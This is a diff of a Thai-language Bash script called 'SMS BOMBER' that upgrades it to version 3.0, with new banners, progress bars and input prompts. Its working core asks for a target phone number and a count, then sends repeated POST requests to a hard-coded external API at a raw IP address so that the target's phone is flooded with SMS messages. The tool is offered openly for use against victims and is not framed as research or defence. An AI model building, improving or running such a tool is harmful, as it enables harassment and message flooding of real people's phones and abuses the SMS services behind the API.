@@ -1,61 +1,247 @@
 #!/bin/bash
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# 💣 SMS BOMBER - Client for API
-# ยิง SMS ผ่าน API: http://141.98.17.37:3000
-# by DeV ต้น X9CODESHOP
+# ╔═════════════════════════════════════════════════════════════════════════════╗
+# ║                                                                             ║
+# ║   ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗  ║
+# ║   ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗ ║
+# ║   ███████╗██╔████╔██║█████╗      ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝ ║
+# ║   ╚════██║██║╚██╔╝██║██╔══╝      ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗ ║
+# ║   ███████║██║ ╚═╝ ██║███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║ ║
+# ║   ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ║
+# ║                                                                             ║
+# ║                    💣 เครื่องมือยิง SMS ผ่าน API 💣                          ║
+# ║                         by DeV ต้น X9CODESHOP                               ║
+# ╚═════════════════════════════════════════════════════════════════════════════╝
 # ═══════════════════════════════════════════════════════════════════════════════
 
 API_URL="${SMS_API_URL:-http://141.98.17.37:3000}"
-VERSION="2.0"
+VERSION="3.0"
 
-# ─── Colors ───────────────────────────────────────────────────────────────────
-RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
-BLUE='\033[0;34m'; MAGENTA='\033[0;35m'; CYAN='\033[0;36m'
-WHITE='\033[1;37m'; GRAY='\033[0;90m'; NC='\033[0m'; BOLD='\033[1m'
+# ─── Colors & Styles ──────────────────────────────────────────────────────────
+BLK='\033[0;30m'; RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[0;33m'
+BLU='\033[0;34m'; MGN='\033[0;35m'; CYN='\033[0;36m'; WHT='\033[0;37m'
+BBLK='\033[1;30m'; BRED='\033[1;31m'; BGRN='\033[1;32m'; BYLW='\033[1;33m'
+BBLU='\033[1;34m'; BMGN='\033[1;35m'; BCYN='\033[1;36m'; BWHT='\033[1;37m'
+GRY='\033[90m'; LRED='\033[91m'; LGRN='\033[92m'; LYLW='\033[93m'
+LBLU='\033[94m'; LMGN='\033[95m'; LCYN='\033[96m'; LWHT='\033[97m'
+NC='\033[0m'; BOLD='\033[1m'; DIM='\033[2m'; ITALIC='\033[3m'
+UNDERLINE='\033[4m'; BLINK='\033[5m'; REVERSE='\033[7m'
+
+# ─── Box Drawing Characters ───────────────────────────────────────────────────
+HLINE='═'; VLINE='║'; TL='╔'; TR='╗'; BL='╚'; BR='╝'
+TTEE='╦'; BTEE='╩'; LTEE='╠'; RTEE='╣'; CROSS='╬'
+
+# ─── Functions ────────────────────────────────────────────────────────────────
+clear_screen() {
+    clear 2>/dev/null || printf '\033[2J\033[H'
+}
+
+print_center() {
+    local text="$1"
+    local color="${2:-$NC}"
+    local width=79
+    local padding=$(( (width - ${#text}) / 2 ))
+    printf "%${padding}s${color}%s${NC}%${padding}s\n" "" "$text" ""
+}
+
+print_line() {
+    local char="${1:-$HLINE}"
+    local color="${2:-$MGN}"
+    printf "${color}%s${NC}\n" "$(printf '%0.s'"$char" $(seq 1 79))"
+}
+
+print_box_top() {
+    echo -e "${MGN}${TL}$(printf '%0.s'"$HLINE" $(seq 1 77))${TR}${NC}"
+}
+
+print_box_bottom() {
+    echo -e "${MGN}${BL}$(printf '%0.s'"$HLINE" $(seq 1 77))${BR}${NC}"
+}
+
+print_box_line() {
+    local text="$1"
+    local color="${2:-$WHT}"
+    local padding=$(( (77 - ${#text}) / 2 ))
+    local extra=$(( (77 - ${#text}) % 2 ))
+    printf "${MGN}${VLINE}${NC}%${padding}s${color}%s${NC}%${padding}s" "" "$text" ""
+    [ $extra -eq 1 ] && printf " "
+    echo -e "${MGN}${VLINE}${NC}"
+}
 
 # ─── Banner ───────────────────────────────────────────────────────────────────
 show_banner() {
-    clear 2>/dev/null || true
+    clear_screen
     echo ""
-    echo -e "${MAGENTA}    ╔═══════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${MAGENTA}    ║${NC}                                                           ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}   ${RED}▄▄▄  ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄${NC}   ${YELLOW}███████╗███╗   ███╗███████╗${NC}   ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}   ${RED}█  █ █   █ █   █ █${NC}       ${YELLOW}██╔════╝████╗ ████║██╔════╝${NC}   ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}   ${RED}▀▀▀▄ █   █ █▄▄▄█ █▄▄▄▄${NC}  ${YELLOW}███████╗██╔████╔██║█████╗  ${NC}   ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}   ${RED}▄  █ █   █     █     █${NC}  ${YELLOW}╚════██║██║╚██╔╝██║██╔══╝  ${NC}   ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}   ${RED}▀▀▀  ▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀${NC}  ${YELLOW}███████║██║ ╚═╝ ██║███████╗${NC}   ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}                               ${YELLOW}╚══════╝╚═╝     ╚═╝╚══════╝${NC}   ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}                                                           ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}          ${CYAN}💣 SMS BOMBER - API Client${NC}                     ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}          ${GRAY}v${VERSION} | by DeV ต้น X9CODESHOP${NC}                 ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ║${NC}                                                           ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}    ╚═══════════════════════════════════════════════════════════╝${NC}"
+    echo -e "${MGN}                              ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                              ${NC}"
+    echo -e "${MGN}                         ▄▄▄▄▀▀▀▀          ▀▀▀▀▄▄▄▄                         ${NC}"
+    echo -e "${MGN}                     ▄▄▀▀                          ▀▀▄▄                     ${NC}"
+    echo -e "${MGN}                  ▄█▀                                  ▀█▄                  ${NC}"
+    echo -e "${MGN}                ▄█▀     ${CYN}███████╗███╗   ███╗███████╗${MGN}     ▀█▄                ${NC}"
+    echo -e "${MGN}              ▄█▀       ${CYN}██╔════╝████╗ ████║██╔════╝${MGN}       ▀█▄              ${NC}"
+    echo -e "${MGN}             ▄█         ${CYN}███████╗██╔████╔██║█████╗ ${MGN}         █▄             ${NC}"
+    echo -e "${MGN}            ▄█          ${CYN}╚════██║██║╚██╔╝██║██╔══╝ ${MGN}          █▄            ${NC}"
+    echo -e "${MGN}           ▐█           ${CYN}███████║██║ ╚═╝ ██║███████╗${MGN}           █▌           ${NC}"
+    echo -e "${MGN}           ▐█           ${CYN}╚══════╝╚═╝     ╚═╝╚══════╝${MGN}           █▌           ${NC}"
+    echo -e "${MGN}            █▄                                           ▄█            ${NC}"
+    echo -e "${MGN}            ▀█▄                                         ▄█▀            ${NC}"
+    echo -e "${MGN}              ▀█▄         ${RED}██████╗  ██████╗ ███╗   ███╗${MGN}         ▄█▀              ${NC}"
+    echo -e "${MGN}               ▀█▄        ${RED}██╔══██╗██╔═══██╗████╗ ████║${MGN}        ▄█▀               ${NC}"
+    echo -e "${MGN}                 ▀█▄      ${RED}██████╔╝██║   ██║██╔████╔██║${MGN}      ▄█▀                 ${NC}"
+    echo -e "${MGN}                   ▀█▄    ${RED}██╔══██╗██║   ██║██║╚██╔╝██║${MGN}    ▄█▀                   ${NC}"
+    echo -e "${MGN}                     ▀█▄  ${RED}██████╔╝╚██████╔╝██║ ╚═╝ ██║${MGN}  ▄█▀                     ${NC}"
+    echo -e "${MGN}                       ▀█▄${RED}╚═════╝  ╚═════╝ ╚═╝     ╚═╝${MGN}▄█▀                       ${NC}"
+    echo -e "${MGN}                         ▀█▄                        ▄█▀                         ${NC}"
+    echo -e "${MGN}                           ▀█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▀                           ${NC}"
+    echo -e "${MGN}                              ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀                              ${NC}"
     echo ""
+    print_box_top
+    print_box_line "⚡ ระบบยิง SMS อัตโนมัติ ผ่าน API ⚡" "$LYLW"
+    print_box_line ""
+    print_box_line "เวอร์ชั่น ${VERSION} | พัฒนาโดย ${CYN}DeV ต้น X9CODESHOP" "$GRY"
+    print_box_bottom
+    echo ""
+}
+
+# ─── Loading Animation ────────────────────────────────────────────────────────
+loading_spinner() {
+    local msg="$1"
+    local pid=$2
+    local spin='⣾⣽⣻⢿⡿⣟⣯⣷'
+    local i=0
+    
+    while kill -0 $pid 2>/dev/null; do
+        i=$(( (i+1) % 8 ))
+        printf "\r${CYN}  ${spin:$i:1} ${msg}${NC}"
+        sleep 0.1
+    done
+    printf "\r${LGRN}  ✓ ${msg} เสร็จสิ้น${NC}                    \n"
 }
 
 # ─── Check Dependencies ───────────────────────────────────────────────────────
 check_deps() {
+    echo -e "${CYN}  ⚙️  กำลังตรวจสอบระบบ...${NC}"
+    
     if ! command -v curl &> /dev/null; then
-        echo -e "${RED}❌ กรุณาติดตั้ง curl ก่อน${NC}"
-        echo -e "${GRAY}   apt install curl หรือ yum install curl${NC}"
+        echo -e "${BRED}  ✗ ไม่พบ curl กรุณาติดตั้งก่อน${NC}"
         exit 1
     fi
+    
+    sleep 0.5
+    echo -e "${LGRN}  ✓ ระบบพร้อมใช้งาน${NC}"
 }
 
 # ─── Check API ────────────────────────────────────────────────────────────────
 check_api() {
-    echo -e "${CYAN}📡 กำลังตรวจสอบ API...${NC}"
+    echo ""
+    echo -e "${BYLW}  🔌 กำลังเชื่อมต่อ API...${NC}"
     
+    local response
     response=$(curl -s -o /dev/null -w "%{http_code}" "${API_URL}/health" --max-time 5 2>/dev/null)
     
-    if [ "$response" != "200" ]; then
-        echo -e "${RED}❌ API ไม่ตอบสนอง (HTTP $response)${NC}"
-        echo -e "${GRAY}   URL: ${API_URL}${NC}"
-        exit 1
+    if [ "$response" == "200" ]; then
+        echo -e "${LGRN}  ✓ เชื่อมต่อ API สำเร็จ${NC}"
+        return 0
     else
-        echo -e "${GREEN}✅ API พร้อมใช้งาน${NC}"
+        echo -e "${BRED}  ✗ ไม่สามารถเชื่อมต่อ API ได้ (HTTP ${response})${NC}"
+        echo ""
+        echo -e "${YLW}  💡 กรุณาตรวจสอบ:${NC}"
+        echo -e "     - อินเทอร์เน็ตเชื่อมต่ออยู่หรือไม่"
+        echo -e "     - API กำลังทำงานอยู่หรือไม่"
+        exit 1
     fi
+}
+
+# ─── Input Functions ──────────────────────────────────────────────────────────
+input_phone() {
+    echo ""
+    print_line "─" "$CYN"
+    echo -e "${BWHT}  📱 ขั้นตอนที่ 1: ระบุเป้าหมาย${NC}"
+    print_line "─" "$CYN"
+    echo ""
+    echo -e "  ${GRY}รูปแบบ: 0812345678 (ตัวเลข 10 หลัก ไม่ต้องมีขีด)${NC}"
+    echo ""
+    
+    while true; do
+        echo -ne "  ${CYN}➤ เบอร์โทรศัพท์: ${NC}${BWHT}"
+        read phone
+        echo -ne "${NC}"
+        
+        if [[ "$phone" =~ ^[0-9]{10}$ ]]; then
+            break
+        else
+            echo -e "  ${BRED}✗ เบอร์โทรไม่ถูกต้อง กรุณาใส่ตัวเลข 10 หลัก${NC}"
+            echo ""
+        fi
+    done
+}
+
+input_count() {
+    echo ""
+    print_line "─" "$CYN"
+    echo -e "${BWHT}  🔢 ขั้นตอนที่ 2: ระบุจำนวน${NC}"
+    print_line "─" "$CYN"
+    echo ""
+    echo -e "  ${GRY}แนะนำ: 10-100 ครั้ง (ค่าที่เหมาะสม)${NC}"
+    echo ""
+    
+    while true; do
+        echo -ne "  ${CYN}➤ จำนวนครั้ง: ${NC}${BWHT}"
+        read count
+        echo -ne "${NC}"
+        
+        if [[ "$count" =~ ^[0-9]+$ ]] && [ "$count" -ge 1 ] && [ "$count" -le 100 ]; then
+            break
+        else
+            echo -e "  ${BRED}✗ จำนวนไม่ถูกต้อง กรุณาใส่ตัวเลข 1-100${NC}"
+            echo ""
+        fi
+    done
+}
+
+# ─── Confirmation ─────────────────────────────────────────────────────────────
+confirm_attack() {
+    echo ""
+    print_line "─" "$YLW"
+    echo -e "${BYLW}  ⚠️  ยืนยันการดำเนินการ${NC}"
+    print_line "─" "$YLW"
+    echo ""
+    echo -e "  ${WHT}┌─────────────────────────────────────────┐${NC}"
+    echo -e "  ${WHT}│${NC}  📱 เป้าหมาย: ${BWHT}${phone}${NC}"
+    echo -e "  ${WHT}│${NC}  🔢 จำนวน: ${BWHT}${count}${NC} ครั้ง"
+    echo -e "  ${WHT}│${NC}  🌐 ผ่าน: ${GRY}API${NC}"
+    echo -e "  ${WHT}└─────────────────────────────────────────┘${NC}"
+    echo ""
+    echo -ne "  ${YLW}➤ ยืนยันการยิง SMS? (y/n): ${NC}${BWHT}"
+    read confirm
+    echo -ne "${NC}"
+    
+    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
+        echo ""
+        echo -e "  ${CYN}ℹ️  ยกเลิกการดำเนินการ${NC}"
+        exit 0
+    fi
+}
+
+# ─── Progress Bar ─────────────────────────────────────────────────────────────
+show_progress() {
+    local current=$1
+    local total=$2
+    local success=$3
+    local failed=$4
+    local width=50
+    local progress=$(( (current * width) / total ))
+    local percentage=$(( (current * 100) / total ))
+    
+    printf "\r  ${CYN}▶${NC} ["
+    for ((i=0; i<width; i++)); do
+        if [ $i -lt $progress ]; then
+            printf "${LGRN}█${NC}"
+        else
+            printf "${GRY}░${NC}"
+        fi
+    done
+    printf "] ${BWHT}%3d%%${NC} | ${LGRN}✓ %d${NC} | ${LRED}✗ %d${NC}" "$percentage" "$success" "$failed"
 }
 
 # ─── Send SMS via API ─────────────────────────────────────────────────────────
@@ -66,15 +252,14 @@ send_sms_api() {
     local fail_count=0
     
     echo ""
-    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${MAGENTA}║${NC}                    ${BOLD}🚀 เริ่มยิง SMS${NC}                        ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}"
+    print_line "=" "$MGN"
+    echo -e "${BMGN}  🚀 เริ่มยิง SMS...${NC}"
+    print_line "=" "$MGN"
     echo ""
     
     for ((i=1; i<=count; i++)); do
-        printf "\r${CYAN}📤 กำลังส่ง: ${BOLD}%d/%d${NC}  |  ${GREEN}สำเร็จ: %d${NC}  |  ${RED}ล้มเหลว: %d${NC}" "$i" "$count" "$success_count" "$fail_count"
+        show_progress $i $count $success_count $fail_count
         
-        # ส่ง request ไปยัง API
         response=$(curl -s -X POST "${API_URL}/send" \
             -H "Content-Type: application/json" \
             -d "{\"phone\":\"$phone\",\"count\":1}" \
@@ -86,20 +271,68 @@ send_sms_api() {
             ((fail_count++))
         fi
         
-        # ดีเลย์เล็กน้อย
         sleep 0.3
     done
     
     echo ""
     echo ""
-    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${MAGENTA}║${NC}                    ${BOLD}📊 สรุปผลลัพธ์${NC}                        ${MAGENTA}║${NC}"
-    echo -e "${MAGENTA}╠═══════════════════════════════════════════════════════════╣${NC}"
-    printf "${MAGENTA}║${NC}  📱 เบอร์เป้าหมาย: ${BOLD}%s${NC}%*s${MAGENTA}║${NC}\n" "$phone" $((35 - ${#phone})) ""
-    printf "${MAGENTA}║${NC}  📨 จำนวนทั้งหมด: ${BOLD}%d${NC} ครั้ง%*s${MAGENTA}║${NC}\n" "$count" $((26 - ${#count})) ""
-    printf "${MAGENTA}║${NC}  ${GREEN}✅ สำเร็จ: %d ครั้ง${NC}%*s${MAGENTA}║${NC}\n" "$success_count" $((32 - ${#success_count})) ""
-    printf "${MAGENTA}║${NC}  ${RED}❌ ล้มเหลว: %d ครั้ง${NC}%*s${MAGENTA}║${NC}\n" "$fail_count" $((33 - ${#fail_count})) ""
-    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}"
+}
+
+# ─── Show Results ─────────────────────────────────────────────────────────────
+show_results() {
+    local phone=$1
+    local count=$2
+    local success=$3
+    local failed=$4
+    
+    print_line "=" "$MGN"
+    echo -e "${BMGN}  📊 สรุปผลการดำเนินการ${NC}"
+    print_line "=" "$MGN"
+    echo ""
+    echo -e "  ${WHT}╔══════════════════════════════════════════════════════════╗${NC}"
+    printf "  ${WHT}║${NC}  📱 เป้าหมาย:     ${BWHT}%-40s${WHT}║${NC}\n" "$phone"
+    printf "  ${WHT}║${NC}  📨 จำนวนทั้งหมด: ${BWHT}%-3d ครั้ง%-33s${WHT}║${NC}\n" "$count" ""
+    printf "  ${WHT}║${NC}  ${LGRN}✓ สำเร็จ:${NC}        ${LGRN}%-3d ครั้ง%-33s${WHT}║${NC}\n" "$success" ""
+    printf "  ${WHT}║${NC}  ${LRED}✗ ล้มเหลว:${NC}       ${LRED}%-3d ครั้ง%-33s${WHT}║${NC}\n" "$failed" ""
+    echo -e "  ${WHT}╚══════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+    
+    if [ $success -eq $count ]; then
+        echo -e "  ${LGRN}🎉 ยิงสำเร็จทั้งหมด!${NC}"
+    elif [ $success -gt 0 ]; then
+        echo -e "  ${YLW}⚡ ยิงสำเร็จบางส่วน${NC}"
+    else
+        echo -e "  ${BRED}💥 ยิงไม่สำเร็จเลย${NC}"
+    fi
+}
+
+# ─── Quick Mode ───────────────────────────────────────────────────────────────
+quick_mode() {
+    local phone=$1
+    local count=$2
+    
+    check_deps
+    check_api
+    
+    # Validate
+    if [[ ! "$phone" =~ ^[0-9]{10}$ ]]; then
+        echo -e "${BRED}✗ เบอร์โทรไม่ถูกต้อง! ต้องเป็นตัวเลข 10 หลัก${NC}"
+        exit 1
+    fi
+    
+    if [[ ! "$count" =~ ^[0-9]+$ ]] || [ "$count" -lt 1 ] || [ "$count" -gt 100 ]; then
+        echo -e "${BRED}✗ จำนวนไม่ถูกต้อง! ต้องอยู่ระหว่าง 1-100${NC}"
+        exit 1
+    fi
+    
+    show_banner
+    
+    echo -e "  ${CYN}📱 เป้าหมาย:${NC} ${BWHT}$phone${NC}"
+    echo -e "  ${CYN}🔢 จำนวน:${NC} ${BWHT}$count${NC} ครั้ง"
+    echo ""
+    
+    send_sms_api "$phone" "$count"
+    show_results "$phone" "$count" $success_count $fail_count
 }
 
 # ─── Interactive Mode ─────────────────────────────────────────────────────────
@@ -107,94 +340,35 @@ interactive_mode() {
     show_banner
     check_deps
     check_api
-    echo ""
     
-    # รับเบอร์โทร
-    echo -e "${CYAN}📱 กรุณาใส่เบอร์โทรศัพท์เป้าหมาย${NC}"
-    echo -e "${GRAY}   (ตัวอย่าง: 0812345678)${NC}"
-    echo ""
-    read -p "   ➤ เบอร์โทร: " phone
+    input_phone
+    input_count
+    confirm_attack
     
-    # ตรวจสอบเบอร์
-    if [[ ! "$phone" =~ ^[0-9]{10}$ ]]; then
-        echo ""
-        echo -e "${RED}❌ เบอร์โทรไม่ถูกต้อง! ต้องเป็นตัวเลข 10 หลัก${NC}"
-        exit 1
-    fi
-    
-    echo ""
-    
-    # รับจำนวน
-    echo -e "${CYAN}🔢 กรุณาใส่จำนวนครั้งที่ต้องการยิง${NC}"
-    echo -e "${GRAY}   (แนะนำ: 10-100)${NC}"
-    echo ""
-    read -p "   ➤ จำนวน: " count
-    
-    # ตรวจสอบจำนวน
-    if [[ ! "$count" =~ ^[0-9]+$ ]] || [ "$count" -lt 1 ] || [ "$count" -gt 100 ]; then
-        echo ""
-        echo -e "${RED}❌ จำนวนไม่ถูกต้อง! ต้องอยู่ระหว่าง 1-100${NC}"
-        exit 1
-    fi
-    
-    echo ""
-    echo -e "${YELLOW}⚠️  ยืนยันการยิง SMS?${NC}"
-    echo -e "   เบอร์: ${BOLD}$phone${NC}"
-    echo -e "   จำนวน: ${BOLD}$count${NC} ครั้ง"
-    echo ""
-    read -p "   ยืนยัน (y/n): " confirm
-    
-    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
-        echo ""
-        echo -e "${CYAN}ℹ️ ยกเลิกการยิง${NC}"
-        exit 0
-    fi
-    
-    # เริ่มยิง
     send_sms_api "$phone" "$count"
+    show_results "$phone" "$count" $success_count $fail_count
     
     echo ""
-    echo -e "${CYAN}🙏 ขอบคุณที่ใช้ SMS BOMBER${NC}"
+    echo -e "  ${CYN}🙏 ขอบคุณที่ใช้บริการ${NC} ${BWHT}SMS BOMBER${NC}"
+    echo -e "  ${GRY}by DeV ต้น X9CODESHOP${NC}"
     echo ""
-}
-
-# ─── Quick Mode (Arguments) ───────────────────────────────────────────────────
-quick_mode() {
-    local phone=$1
-    local count=$2
-    
-    check_deps
-    
-    # Validate
-    if [[ ! "$phone" =~ ^[0-9]{10}$ ]]; then
-        echo -e "${RED}❌ เบอร์โทรไม่ถูกต้อง! ต้องเป็นตัวเลข 10 หลัก${NC}"
-        exit 1
-    fi
-    
-    if [[ ! "$count" =~ ^[0-9]+$ ]] || [ "$count" -lt 1 ] || [ "$count" -gt 100 ]; then
-        echo -e "${RED}❌ จำนวนไม่ถูกต้อง! ต้องอยู่ระหว่าง 1-100${NC}"
-        exit 1
-    fi
-    
-    check_api
-    send_sms_api "$phone" "$count"
 }
 
 # ─── Show Help ────────────────────────────────────────────────────────────────
 show_help() {
     show_banner
-    echo "📖 วิธีใช้: $0 [เบอร์] [จำนวน]"
+    echo -e "${BWHT}  📖 วิธีใช้งาน:${NC}"
     echo ""
-    echo "ตัวอย่าง:"
-    echo "  $0                  - โหมด Interactive (ถามข้อมูล)"
-    echo "  $0 0812345678 10    - ยิงทันที 10 ครั้ง"
-    echo "  $0 help             - แสดงวิธีใช้"
+    echo -e "  ${CYN}• โหมด Interactive (แนะนำ):${NC}"
+    echo -e "    ${GRY}$0${NC}"
     echo ""
-    echo "ตัวแปรแวดล้อม:"
-    echo "  SMS_API_URL         - เปลี่ยน URL API (ค่าเริ่มต้น: http://141.98.17.37:3000)"
+    echo -e "  ${CYN}• โหมดเร็ว (ผ่าน Arguments):${NC}"
+    echo -e "    ${GRY}$0 <เบอร์> <จำนวน>${NC}"
+    echo -e "    ${GRY}$0 0812345678 10${NC}"
     echo ""
-    echo "ตัวอย่างเปลี่ยน API:"
-    echo "  SMS_API_URL=http://localhost:3000 $0 0812345678 10"
+    echo -e "  ${CYN}• เปลี่ยน API:${NC}"
+    echo -e "    ${GRY}SMS_API_URL=http://localhost:3000 $0${NC}"
+    echo ""
 }
 
 # ─── Main ─────────────────────────────────────────────────────────────────────
